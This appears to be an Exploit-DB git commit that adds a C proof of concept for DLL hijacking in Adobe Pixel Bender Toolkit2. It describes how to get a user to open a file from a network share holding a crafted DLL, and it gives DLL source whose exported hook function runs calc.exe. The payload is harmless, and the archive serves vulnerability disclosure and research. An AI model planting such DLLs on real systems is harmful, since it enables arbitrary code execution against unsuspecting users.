84f5ff00f8eaeb36063881d153ccbeb0245ade2b
Offensive Security <info@exploit-db.com>
2015-07-21 05:01:45 +0000

    DB: 2015-07-21
    16 new exploits

---
+++ platforms/windows/remote/37655.c
@@ -0,0 +1,18 @@
+source: http://www.securityfocus.com/bid/55179/info
+
+Adobe Pixel Bender Toolkit2 is prone to multiple vulnerabilities that allow attackers execute arbitrary code.
+
+An attacker can exploit these issues by enticing a legitimate user to use the vulnerable application to open a file from a network share location that contains a specially crafted Dynamic Link Library (DLL) file. 
+
+#include <windows.h>
+#define DllExport __declspec (dllexport)
+
+DllExport void hook_startup() { exp(); }
+
+int exp()
+{
+  WinExec("calc", 0);
+  exit(0);
+  return 0;
+}
+
